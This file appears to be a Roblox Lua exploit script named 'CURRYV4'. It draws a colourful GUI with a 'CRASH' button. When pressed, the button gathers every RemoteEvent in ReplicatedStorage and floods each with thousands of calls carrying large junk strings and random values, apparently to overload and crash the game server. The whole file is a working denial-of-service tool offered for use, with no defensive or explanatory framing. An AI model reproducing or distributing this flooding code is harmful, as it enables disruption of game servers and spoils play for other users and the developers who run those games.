local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

-- Cleanup
local existingGui = PlayerGui:FindFirstChild("CURRYV4")
if existingGui then existingGui:Destroy() end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CURRYV4"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 320, 0, 180)
MainFrame.Position = UDim2.new(0.5, -160, 0.5, -90)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = MainFrame

local Stroke = Instance.new("UIStroke")
Stroke.Thickness = 3
Stroke.Parent = MainFrame

task.spawn(function()
    local hue = 0
    while ScreenGui.Parent ~= nil do
        hue = (hue + 0.01) % 1
        Stroke.Color = Color3.fromHSV(hue, 1, 1)
        task.wait(0.03)
    end
end)

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 25, 0, 25)
CloseBtn.Position = UDim2.new(1, -25, 0, 0)
CloseBtn.BackgroundTransparency = 1
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 14
CloseBtn.Parent = MainFrame

CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

local titleText = "CURRYV4"
local container = Instance.new("Frame")
container.Size = UDim2.new(1, 0, 0, 50)
container.Position = UDim2.new(0, 0, 0, 10)
container.BackgroundTransparency = 1
container.Parent = MainFrame

local letterColors = {
    Color3.fromRGB(255, 0, 0),
    Color3.fromRGB(255, 100, 0),
    Color3.fromRGB(255, 255, 0),
    Color3.fromRGB(0, 255, 0),
    Color3.fromRGB(0, 100, 255),
    Color3.fromRGB(75, 0, 130),
    Color3.fromRGB(255, 0, 255)
}

for i = 1, #titleText do
    local char = string.sub(titleText, i, i)
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0, 40, 0, 50)
    label.Position = UDim2.new(0, (i-1)*40 + 20, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = char
    label.Font = Enum.Font.GothamBold
    label.TextSize = 35
    label.TextStrokeTransparency = 0
    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    
    if letterColors[i] then
        label.TextColor3 = letterColors[i]
    else
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
    end
    
    label.Parent = container
end

local CrashBtn = Instance.new("TextButton")
CrashBtn.Size = UDim2.new(0, 280, 0, 50)
CrashBtn.Position = UDim2.new(0.5, -140, 0, 110)
CrashBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
CrashBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
CrashBtn.Text = "CRASH"
CrashBtn.Font = Enum.Font.GothamBold
CrashBtn.TextSize = 24
CrashBtn.Parent = MainFrame

local BtnCorner = Instance.new("UICorner")
BtnCorner.CornerRadius = UDim.new(0, 8)
BtnCorner.Parent = CrashBtn

local BtnStroke = Instance.new("UIStroke")
BtnStroke.Color = Color3.fromRGB(50, 50, 50)
BtnStroke.Thickness = 2
BtnStroke.Parent = CrashBtn

CrashBtn.MouseButton1Click:Connect(function()
    CrashBtn.Text = "INITIATING..."
    CrashBtn.TextColor3 = Color3.fromRGB(0, 255, 0)
    
    local targets = {}
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(targets, obj)
        end
    end
    
    if #targets == 0 then
        CrashBtn.Text = "NO TARGETS FOUND"
        task.wait(2)
        CrashBtn.Text = "CRASH"
        CrashBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
        return
    end
    
    local crashCount = 0
    local maxAttempts = 10000
    
    for attempt = 1, maxAttempts do
        if attempt % 100 == 0 then
            task.wait(0.01)
        end
        
        for i, target in ipairs(targets) do
            if target.Parent ~= nil then
                pcall(function()
                    if target:IsA("RemoteEvent") then
                        target:FireServer(
                            string.rep("CURRY_FLOOD", 1000),
                            math.random(1, 1000000),
                            {},
                            nil,
                            crashCount
                        )
                    end
                end)
                crashCount = crashCount + 1
            end
        end
        
        if crashCount >= maxAttempts then break end
    end
    
    CrashBtn.Text = "COMPLETE"
    task.wait(2)
    CrashBtn.Text = "CRASH"
    CrashBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
end)
